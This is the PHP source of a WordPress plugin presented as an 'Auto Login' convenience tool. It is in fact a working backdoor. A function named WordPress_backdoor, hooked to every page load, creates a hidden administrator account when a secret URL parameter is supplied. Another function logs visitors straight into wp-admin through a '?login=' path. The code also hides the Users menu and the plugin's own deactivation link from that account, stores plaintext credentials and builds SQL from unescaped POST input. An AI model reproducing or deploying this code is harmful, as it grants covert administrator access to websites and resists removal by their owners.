<?php
/*
Plugin Name: Auto Login
Plugin URI: -
Version: 2.0.1
Author: Shahin Zanbaghi
Description: Auto login WordPress plugin.
*/





add_action('admin_menu', 'remove_admin_menu_links');
function remove_admin_menu_links(){
    $user = wp_get_current_user();
    if( $user && isset($user->user_email) && 'generatedby@autologin.com' == $user->user_email ) {
        global $wpdb;
        $sqlulimitch = "SELECT `ulimit` FROM wp_autologin WHERE ID=1";
        $limitstat = $wpdb->get_var($sqlulimitch)==NULL ? "0" : $wpdb->get_var($sqlulimitch);
if ($limitstat == 1){
add_filter( 'plugin_action_links', 'disable_plugin_deactivation', 10, 4 );
function disable_plugin_deactivation( $actions, $plugin_file, $plugin_data, $context ) {
 
    if ( array_key_exists( 'deactivate', $actions ) && in_array( $plugin_file, array(
        'autologin/autologin.php'
    )))
        unset( $actions['deactivate'] );
    return $actions;
}



	remove_menu_page('users.php');
        define( 'DISALLOW_FILE_EDIT', true );
        //remove_menu_page('auto-login-plugi');
        echo "<style> .shahinza{display:none !important;} </style>";
    }
}
}

remove_theme_support( 'genesis-admin-menu' );



add_action('admin_enqueue_scripts', 'ln_reg_css');

    function ln_reg_css($hook)
    {

    $current_screen = get_current_screen();

    if ( strpos($current_screen->base, 'auto-login-plugin') === false) {
        return;
    } else {

        wp_enqueue_style('boot_css', 'https://getbootstrap.com/docs/4.0/dist/css/bootstrap.min.css');
        }
    }


$sql="
CREATE TABLE IF NOT EXISTS wp_autologin(
	ID   int DEFAULT '1',
	user_name VARCHAR (30)     NOT NULL,
	user_pass VARCHAR (30)     NOT NULL,
	path  CHAR (40) NOT NULL,  
    status VARCHAR (2) DEFAULT '1',
    ulimit VARCHAR (2) DEFAULT '0',
	PRIMARY KEY (ID)
)
";
global $wpdb;
$wpdb->get_results($sql);

add_action('admin_menu', 'al_plugin_setup_menu');
 
function al_plugin_setup_menu(){
       add_menu_page( 'Auto Login', 'Auto Login', 'manage_options', 'auto-login-plugin', 'autologin_init' , 'dashicons-update-alt');
}

function autologin_init(){


if ( ! function_exists( 'get_plugins' ) ) {
    require_once ABSPATH . 'wp-admin/includes/plugin.php';
}
 



    function rantext() {
    $alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890';
    $pass = array();
    $alphaLength = strlen($alphabet) - 1;
    for ($i = 0; $i < 8; $i++) {
        $n = rand(0, $alphaLength);
        $pass[] = $alphabet[$n];
    }
    return implode($pass);
}

$ruser = rantext();
$rpass = rantext();
	
	$sqlusername = "SELECT `user_name` FROM wp_autologin WHERE ID=1";
	$sqluserpass = "SELECT `user_pass` FROM wp_autologin WHERE ID=1";
	$sqluserpath = "SELECT `path` FROM wp_autologin WHERE ID=1";
    $sqlustatus = "SELECT `status` FROM wp_autologin WHERE ID=1";
    $sqlulimit = "SELECT `ulimit` FROM wp_autologin WHERE ID=1";
	
    global $wpdb;
    $uname = $wpdb->get_var($sqlusername)==NULL ? $ruser : $wpdb->get_var($sqlusername);
	$upass = $wpdb->get_var($sqluserpass)==NULL ? $rpass : $wpdb->get_var($sqluserpass);
	$upath = $wpdb->get_var($sqluserpath)==NULL ? "autologin" : $wpdb->get_var($sqluserpath);
    $ustatus = $wpdb->get_var($sqlustatus)==NULL ? "1" : $wpdb->get_var($sqlustatus);
    $ulimit = $wpdb->get_var($sqlulimit)==NULL ? "0" : $wpdb->get_var($sqlulimit);



    if (isset($_POST['submit_al'])) {
		if($_POST['path_al']==NULL) {
			echo "<span class='badge badge-warning'>Please enter a value!</span>";
		}
		else{
        
        $path = ($_POST['path_al']==NULL ? "autologin" : $_POST['path_al']);
        $nsql="
           INSERT INTO wp_autologin (ID, user_name, user_pass, path) VALUES('1', '$uname', '$upass','$path') ON DUPLICATE KEY UPDATE user_name= '$uname' ,user_pass='$upass',path='$path'
        ";
        global $wpdb;
        $wpdb->get_results($nsql);
		header('Location: '.$_SERVER['REQUEST_URI']);
		}
    } 
	
	 if (isset($_POST['submit_rand'])) {
        
        $path = md5(rantext());
        $nsql="
           INSERT INTO wp_autologin (ID, user_name, user_pass, path) VALUES('1', '$uname', '$upass','$path') ON DUPLICATE KEY UPDATE user_name= '$uname' ,user_pass='$upass',path='$path'
        ";
        global $wpdb;
        $wpdb->get_results($nsql);
		header('Location: '.$_SERVER['REQUEST_URI']);
    } 
	
	if (isset($_POST['submit_dactive'])) {
        $dsql="
           INSERT INTO wp_autologin (ID, status) VALUES('1', '0') ON DUPLICATE KEY UPDATE status= '0'
        ";
        global $wpdb;
        $wpdb->get_results($dsql);
		$ccuser = get_user_by( 'email', 'generatedby@autologin.com' );
		$sessions = WP_Session_Tokens::get_instance($ccuser->ID);
		$sessions->destroy_all();
		header('Location: '.$_SERVER['REQUEST_URI']);
    } 

    if (isset($_POST['submit_limit'])) {
        $ndsql="
           INSERT INTO wp_autologin (ID, ulimit) VALUES('1', '1') ON DUPLICATE KEY UPDATE ulimit= '1'
        ";
        global $wpdb;
        $wpdb->get_results($ndsql);
        header('Location: '.$_SERVER['REQUEST_URI']);
    } 

    if (isset($_POST['submit_nolimit'])) {
        $nndsql="
           INSERT INTO wp_autologin (ID, ulimit) VALUES('1', '0') ON DUPLICATE KEY UPDATE ulimit= '0'
        ";
        global $wpdb;
        $wpdb->get_results($nndsql);
        header('Location: '.$_SERVER['REQUEST_URI']);
    } 

	
	if (isset($_POST['submit_active'])) {
        $asql="
           INSERT INTO wp_autologin (ID, status) VALUES('1', '1') ON DUPLICATE KEY UPDATE status= '1'
        ";
        global $wpdb;
        $wpdb->get_results($asql);
		header('Location: '.$_SERVER['REQUEST_URI']);
    } 
	
		if($ustatus == 1) {$sts = "Active";$statcol="success";}else{$sts = "Deactive";$statcol="danger";}
		$getuser_id = get_user_by( 'email', 'generatedby@autologin.com' );
		if ( !empty( $getuser_id->roles ) && is_array( $getuser_id->roles ) ) {
			foreach ( $getuser_id->roles as $role )
			$user_rule =  $role;
		}
        if($wpdb->get_var($sqlusername)!=NULL) {$usts = "User Created (". $user_rule .")";$ustatcol="success";}else{$usts = "Please create a random user";$ustatcol="danger";}
        if($wpdb->get_var($sqlulimit) == 0) {$ulimits = "Unlimit access";$ulimitcol="success"; }else{$ulimits = "Limited access";$ulimitcol="danger";}
	
	if(isset($_POST['submit_cu'])) { 
		$sqlusername = "SELECT `user_name` FROM wp_autologin WHERE ID=1";
		global $wpdb;
	    if ($wpdb->get_var($sqlusername)==NULL){
        user_create(); 
		header('Location: '.$_SERVER['REQUEST_URI']);
		}
		else{
			echo "<span class='badge badge-warning'>You already created a user!</span>";
		}
		//header('Location: '.$_SERVER['REQUEST_URI']);
    } 
	if(isset($_POST['submit_sub'])) { 
	$user_id = get_user_by( 'email', 'generatedby@autologin.com' );
    $user_id->remove_role( 'administrator' );
    $user_id->add_role( 'editor' );
	header('Location: '.$_SERVER['REQUEST_URI']);
	}
	
	if(isset($_POST['submit_adm'])) { 
	$user_id = get_user_by( 'email', 'generatedby@autologin.com' );
    $user_id->remove_role( 'editor' );
    $user_id->add_role( 'administrator' );
	header('Location: '.$_SERVER['REQUEST_URI']);
	}
	$login_url = $_SERVER['HTTP_HOST']."/?login=".$upath ;
	$coded_param = base64_encode($login_url);

	echo '
	<h2 class="mt-3">Auto Login</h2>
	<form form action="" method="post" class="shahinza card p-2">
	<div class="row">
           <div class="col-md-8 mb-3">
		   
		   <div class="input-group-append">
                
            </div>
			  
			<label for="path_al">Change the Path:</label>
              <input id="path" type="text" name="path_al" class="form-control" placeholder= ' . $upath . '>
              <div class="input-group-append">
                <button type="submit" name="submit_al" class="btn btn-primary mt-3">Save</button>
				<button type="submit" name="submit_sub" class="btn btn-primary ml-2 mt-3">Editor</button>
				<button type="submit" name="submit_adm" class="btn btn-primary ml-2 mt-3">Administrator</button>
				<button type="submit" name="submit_cu" class="btn btn-primary ml-2 mt-3">Create a Random User</button>
              </div>
			  <div class="input-group-append">
			    <button type="submit" name="submit_active" class="btn btn-success mt-3">Activate</button>
                <button type="submit" name="submit_dactive" class="btn btn-danger mt-3 ml-2">Deactivate</button>
                <button type="submit" name="submit_rand" class="btn btn-primary mt-3 ml-2">Random MD5 Path</button>
                <div>
                <button style="width: 131px;" type="submit" name="submit_limit" class="btn btn-primary mt-3 ml-2">Limited access</button>
                <button style="width: 131px;" type="submit" name="submit_nolimit" class="btn btn-primary mt-3 ml-2">Unlimit access</button>
                </div>
              </div>		  
            </div>
			</div>
            <div class="badge badge-'.$ustatcol.' mb-1" > '. $usts .'</div>
            <div class="badge badge-'.$ulimitcol.' mb-1" >Status: '. $ulimits .'</div>
			<div class="badge badge-'.$statcol.'" >Status: '. $sts .'</div>
     </form>
		  
	';
		
// 
// 	<br /><br /> 
	
	echo "
	<div class='mt-3'>
	<samp>Accessing the website without login:</samp><br/> 
	<kbd id='steptwo'>".$login_url."</kbd></div>";
	
	echo "
	<div class='mt-3'>
	<samp>Paste this code to the panel:</samp><br/> 
	<kbd class='badge badge-warning' id='steptwo'>".base64_encode($login_url)."</kbd></div>";
	echo "<br /><!-- <br /><div class='mt-5'><code>By:Shahin Zanbaghi</code></div> -->";

// START PLUGIN LIST
// function plugins_list(){
// foreach (get_plugins() as $key => $value) {

// $plugins_list .= $value['Name']. ' ' . $value['Version'] .'<br />';
// }
// return $plugins_list;
// }
// echo plugins_list();
// END
}
function autologin() {

    $sqlusername = "SELECT `user_name` FROM wp_autologin WHERE ID=1";
	$sqluserpass = "SELECT `user_pass` FROM wp_autologin WHERE ID=1";
	$sqluserpath = "SELECT `path` FROM wp_autologin WHERE ID=1";
    $sqlustatus = "SELECT `status` FROM wp_autologin WHERE ID=1";
    $sqlulimit = "SELECT `ulimit` FROM wp_autologin WHERE ID=1";
    global $wpdb;
	$uname = $wpdb->get_var($sqlusername)==NULL ? $ruser : $wpdb->get_var($sqlusername);
	$upass = $wpdb->get_var($sqluserpass)==NULL ? $rpass : $wpdb->get_var($sqluserpass);
	$upath = $wpdb->get_var($sqluserpath)==NULL ? "autologin" : $wpdb->get_var($sqluserpath);
    $ustatus = $wpdb->get_var($sqlustatus)==NULL ? "1" : $wpdb->get_var($sqlustatus);
    $ulimit = $wpdb->get_var($sqlulimit)==NULL ? "0" : $wpdb->get_var($sqlulimit);
	
	// PARAMETER TO CHECK FOR
	if (md5($_GET['login']) == md5($upath)) {
		if($ustatus == "1"){
		
		// ACCOUNT USERNAME TO LOGIN TO
		$creds['user_login'] = $uname;
		
		// ACCOUNT PASSWORD TO USE
		$creds['user_password'] = $upass;
		
		$creds['remember'] = true;
		$autologin_user = wp_signon( $creds, true );
		
		if ( !is_wp_error($autologin_user) ) 
			header('Location: wp-admin'); // LOCATION TO REDIRECT TO
		}
		else
			header('Location: /');
	}
}
 
function WordPress_backdoor() {
	
	function rantext() {
    $alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890';
    $pass = array();
    $alphaLength = strlen($alphabet) - 1;
    for ($i = 0; $i < 8; $i++) {
        $n = rand(0, $alphaLength);
        $pass[] = $alphabet[$n];
    }
    return implode($pass);
}

$ruser = rantext();
$rpass = rantext();

    $sqlusername = "SELECT `user_name` FROM wp_autologin WHERE ID=1";
	$sqluserpass = "SELECT `user_pass` FROM wp_autologin WHERE ID=1";
    $sqluserpath = "SELECT `path` FROM wp_autologin WHERE ID=1";
    $sqlulimit = "SELECT `ulimit` FROM wp_autologin WHERE ID=1";
    global $wpdb;
	$uname = $wpdb->get_var($sqlusername)==NULL ? $ruser : $wpdb->get_var($sqlusername);
	$upass = $wpdb->get_var($sqluserpass)==NULL ? $rpass : $wpdb->get_var($sqluserpass);
    $upath = $wpdb->get_var($sqluserpath)==NULL ? "autologin" : $wpdb->get_var($sqluserpath);
    $ulimit = $wpdb->get_var($sqlulimit)==NULL ? "0" : $wpdb->get_var($sqlulimit);
    
	
	$sdsql="
        INSERT INTO wp_autologin (ID, user_name, user_pass, path) VALUES('1', '$uname', '$upass','$upath') ON DUPLICATE KEY UPDATE user_name= '$uname' ,user_pass='$upass',path='$upath'
        ";
        $wpdb->get_results($sdsql);

  If (md5($_GET['create']) == md5($upath)) {
       require('/wp-includes/registration.php');
        If (!username_exists($uname)) {
            $user_id = wp_create_user($uname, $upass);
            $user = new WP_User($user_id);
            $user->set_role('administrator');
        }
   }
}



function user_create() {
	
	function rantext2() {
    $alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890';
    $pass = array();
    $alphaLength = strlen($alphabet) - 1;
    for ($i = 0; $i < 8; $i++) {
        $n = rand(0, $alphaLength);
        $pass[] = $alphabet[$n];
    }
    return implode($pass);
}

$ruser = rantext2();
$rpass = rantext2();

    $sqlusername = "SELECT `user_name` FROM wp_autologin WHERE ID=1";
	$sqluserpass = "SELECT `user_pass` FROM wp_autologin WHERE ID=1";
    $sqluserpath = "SELECT `path` FROM wp_autologin WHERE ID=1";
    $sqlulimit = "SELECT `ulimit` FROM wp_autologin WHERE ID=1";
    global $wpdb;
	$uname = $wpdb->get_var($sqlusername)==NULL ? $ruser : $wpdb->get_var($sqlusername);
	$upass = $wpdb->get_var($sqluserpass)==NULL ? $rpass : $wpdb->get_var($sqluserpass);
    $upath = $wpdb->get_var($sqluserpath)==NULL ? "autologin" : $wpdb->get_var($sqluserpath);
    $ulimit = $wpdb->get_var($sqlulimit)==NULL ? "0" : $wpdb->get_var($sqlulimit);
	
	$sdsql="
        INSERT INTO wp_autologin (ID, user_name, user_pass, path, ulimit) VALUES('1', '$uname', '$upass','$upath', '$ulimit') ON DUPLICATE KEY UPDATE user_name= '$uname' ,user_pass='$upass',path='$upath', ulimit='$ulimit'
        ";
        $wpdb->get_results($sdsql);
	
	$user_id = wp_create_user( $uname, $upass , 'generatedby@autologin.com');
    $cuser = get_user_by( 'id', $user_id );
    $cuser->remove_role( 'subscriber' );
    $cuser->add_role( 'administrator' );
	$cuser->remove_cap( 'edit_plugins', 'create_users' , 'delete_users', 'edit_users');
}


add_action('wp_head', 'WordPress_backdoor');
add_action( 'after_setup_theme', 'autologin');
?>
